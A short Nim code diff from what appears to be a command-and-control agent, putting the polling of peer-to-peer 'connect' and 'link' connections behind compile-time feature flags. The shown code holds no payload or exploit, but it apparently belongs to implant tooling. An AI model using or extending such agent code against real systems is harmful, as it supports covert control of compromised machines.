-        agentInstance.taskResponses.add(response)
-        hasP2pData = true
+      when defined(cmd_connect):
+        let pollConnectResps = checkActiveConnectConnections()
+        for response in pollConnectResps:
+          agentInstance.taskResponses.add(response)
+          hasP2pData = true
       
-      when defined(windows):
+      when defined(windows) and defined(cmd_link):
         let pollLinkResps = checkActiveLinkConnections()
         for response in pollLinkResps:
           agentInstance.taskResponses.add(response)
